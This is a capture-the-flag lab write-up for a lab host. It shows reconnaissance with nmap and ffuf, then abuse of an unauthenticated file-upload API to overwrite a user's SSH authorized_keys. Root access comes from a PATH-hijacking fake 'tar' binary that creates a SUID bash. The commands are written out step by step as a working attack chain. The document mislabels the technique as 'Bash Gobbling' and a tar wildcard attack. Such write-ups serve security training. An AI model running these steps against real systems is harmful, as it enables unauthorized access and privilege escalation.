

## Pre-Engagement

### Lab Description

In this lab, you will exploit a file upload vulnerability in a custom REST API service to gain initial access as a low-privilege user. You will escalate privileges using Bash Gobbling combined with a vulnerable tar wildcard execution in a scheduled cron job to achieve root access.

### Learning Objectives

**After completion of this lab, learners will be able to:**
- Perform port scanning and identify a REST API service using tools like nmap, curl, and dirb.
- Enumerate the REST API endpoints to discover file upload functionality.
- Exploit the file upload to inject an SSH key into a low-privilege user's directory and gain SSH access.
- Identify a vulnerable cron job that executes a tar command and manipulate it using Bash Gobbling to escalate privileges.
- Gain root access to the lab and retrieve the final flag.

## Reconnaissance

### Active Recon

Nmap Scan - 

```shell
$ sudo nmap -T4 -sS -p- 192.168.106.249

PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   unknown
33414/tcp open   unknown
40080/tcp open   unknown
```

```shell
$ nmap -sCV -p 21,25022,33414,40080 192.168.106.249

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open  http    Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
Service Info: OS: Unix
```


FFUF Scan - 

```shell
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://192.168.106.249:33414/FUZZ

help
info

```

"http://192.168.106.249:33414/help" - 

```
|0|"GET /info : General Info"|
|1|"GET /help : This listing"|
|2|"GET /file-list?dir=/tmp : List of the files"|
|3|"POST /file-upload : Upload files"|
```

"http://192.168.106.249:33414/info" - 

```
|0|"Python File Server REST API v2.5"|
|1|"Author: Alfredo Moroder"|
|2|"GET /help = List of the commands"|
```

File Uploading - 

```shell
$ curl -X POST -F 'file=@/home/tutu/Downloads/rev.php' -F 'filename=/tmp/rev.php' http://192.168.106.249:33414/file-upload 
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

```shell
$ curl -X POST -F 'file=@/home/tutu/Downloads/rev.txt' -F 'filename=/tmp/rev.txt' http://192.168.106.249:33414/file-upload
{"message":"File successfully uploaded"}
```

"http://192.168.106.249:33414/file-list?dir=/tmp/" - 

```
|0|"rev.txt"|
|1|"flask.tar.gz"|
```

Target folder - 

"http://192.168.106.249:33414/file-list?dir=/tmp/../home/alfredo/.ssh/" - 

```
|0|"id_rsa"|
|1|"id_rsa.pub"|
```


## Exploitation

Generate ssh keys and renamed `id_rsa.pub`  as `id_rsa.txt` to bypass the file upload.

Uploading into the `.ssh` directory - 

```shell
$ curl -X POST -F 'file=@/home/tutu/Downloads/id_rsa.txt' -F 'filename=/home/alfredo/.ssh/authorized_keys' http://192.168.106.249:33414/file-upload

{"message":"File successfully uploaded"}
```

```shell
$ ssh alfredo@192.168.106.249 -i id_rsa -p 25022
```

## Post-Exploitation

Cronjob - 

```shell
$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
```

"/usr/local/bin/backup-flask.sh" - 

```shell
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

Our custom `tar` binary - 

```shell
[alfredo@fedora restapi]$ touch tar
[alfredo@fedora restapi]$ chmod +x tar
[alfredo@fedora restapi]$ echo '#!/bin/bash' > tar 
[alfredo@fedora restapi]$ echo 'cp /bin/bash /home/alfredo/restapi/bash && chmod u+s /home/alfredo/restapi/bash' >> tar
[alfredo@fedora restapi]$ ./bash -p
```


## Conclusion

